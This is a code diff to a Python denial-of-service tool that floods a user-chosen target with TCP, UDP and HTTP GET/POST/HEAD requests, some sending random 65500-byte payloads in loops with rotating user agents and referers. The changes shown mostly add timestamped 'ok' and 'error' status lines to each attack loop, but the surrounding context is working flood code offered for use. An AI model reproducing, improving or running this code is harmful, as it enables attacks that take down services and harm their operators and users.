@@ -5,9 +5,11 @@
 # CodedBy: Oseid Aldary
 # ================================#
 
+from curses.ascii import NUL
 import sys, socket, os, time, random, threading, requests, signal, optparse, re, ctypes
 from urllib.parse import urlparse
 from core.uragents import *
+from datetime import datetime
 import http.client as http
 libgcc_s = ctypes.CDLL('libgcc_s.so.1')
 # COLORS ####################
@@ -20,7 +22,6 @@ version_path = os.path.join('core', 'version.txt')
 attacks = ["get", "post", "head", "tcp", "udp"]
 os.system("cls || clear")
 
-
 def sock_flood():
     global fin_threads
     while True:
@@ -32,11 +33,12 @@ def sock_flood():
                 s.send(random._urandom(65500))
                 if isKilled():
                     break
+                print("[" + yl + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + wi + "] " + successfully_message, end='\r')
                 time.sleep(delay)
             s.close()
         except (socket.error, BrokenPipeError, Exception) as err:
             if not isKilled():
-                print("[" + yl + "!" + wi + "] " + yl + f"{attack.upper()}-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
+                print("[" + yl + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + wi + "] " + error_message, end='\r')
             else:
                 break
             if hasattr(err, 'errno'):
@@ -59,11 +61,12 @@ def get_attack():
             s.sendto(get_packet, (target, port))
             s.shutdown(1)
             if isKilled():
-                break
+                break  
+            print("[" + yl + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + wi + "] " + successfully_message, end='\r')
             time.sleep(delay)
         except (socket.error, BrokenPipeError, Exception, BaseException) as err:
             if not isKilled():
-                print("[" + yl + "!" + wi + "] " + yl + "GET-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
+                print("[" + yl + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + wi + "] " + error_message, end='\r')
             else:
                 break
             if hasattr(err, 'errno'):
@@ -88,10 +91,11 @@ def post_attack():
             s.close()
             if isKilled():
                 break
+            print("[" + yl + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + wi + "] " + successfully_message, end='\r')
             time.sleep(delay)
         except (socket.error, BrokenPipeError, Exception, BaseException) as err:
             if not isKilled():
-                print("[" + yl + "!" + wi + "] " + yl + "POST-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
+                print("[" + yl + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + wi + "] " + error_message, end='\r')
             else:
                 break
             if hasattr(err, 'errno'):
@@ -115,10 +119,11 @@ def head_attack():
             s.close()
             if isKilled():
                 break
+            print("[" + yl + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + wi + "] " + successfully_message, end='\r')
             time.sleep(delay)
         except (socket.error, BrokenPipeError, Exception, BaseException) as err:
             if not isKilled():
-                print("[" + yl + "!" + wi + "] " + yl + "HEAD-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
+                print("[" + yl + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + wi + "] " + error_message, end='\r')
             else:
                 break
             if hasattr(err, 'errno'):
@@ -133,14 +138,14 @@ def head_attack():
 def request_get_attack():
     global fin_threads
     while True:
-        try:
-            req = requests.get(url, headers={'User-Agent': random.choice(headers_useragents), 'Content-Type': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Referer": random.choice(headers_referers)}, timeout=5)
+        try:                   
+            req = requests.get(url, headers={'User-Agent': random.choice(headers_useragents), 'Content-Type': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Referer": random.choice(headers_referers)}, timeout=5)           
             if isKilled():
-                break
+                break            
             time.sleep(delay)
         except (Exception, BaseException) as err:
             if not isKilled():
-                print("[" + yl + "!" + wi + "] " + yl + "REQUEST-GET-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
+                print("[" + yl + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + wi + "] " + error_message, end='\r')
             else:
                 break
             if hasattr(err, 'errno'):
@@ -162,7 +167,7 @@ def request_post_attack():
             time.sleep(delay)
         except (Exception, BaseException) as err:
             if not isKilled():
-                print("[" + yl + "!" + wi + "] " + yl + "REQUEST-POST-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
+                print("[" + yl + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + wi + "] " + error_message, end='\r')
             else:
                 break
             if hasattr(err, 'errno'):
@@ -184,7 +189,7 @@ def request_head_attack():
             time.sleep(delay)
         except (Exception, BaseException) as err:
             if not isKilled():
-                print("[" + yl + "!" + wi + "] " + yl + "REQUEST-HEAD-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
+                print("[" + yl + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + wi + "] " + error_message, end='\r')
             else:
                 break
             if hasattr(err, 'errno'):
@@ -317,6 +322,7 @@ delay = options.delay
 sleep = options.sleep
 update = options.update
 opts = [target, port, threads, attack, delay, sleep, update]
+
 if target:
     if not port:
         port = 80
@@ -351,6 +357,8 @@ if target:
             print(rd + "[" + yl + "!" + rd + "]" + yl + " Error: Invalid Sleep Number Selected" + rd + " !!!" + wi)
             sys.exit(1)
         sleep = float(sleep) if '.' in sleep else int(sleep)
+    error_message = yl + "target: " + wi + target + wi + " | " + yl + "port: " + wi + str(port) + wi + " | "  + yl + "attack: " + wi + str(attack) + " | " + yl + "status: " + rd + "error\n" + wi
+    successfully_message = yl + "target: " + wi + target + wi + " | " + yl + "port: " + wi + str(port) + wi + " | "  + yl + "attack: " + wi + str(attack) + " | " + yl + "status: " + gr + "ok\n" + wi
 elif update:
     update_doseq()
     sys.exit(0)
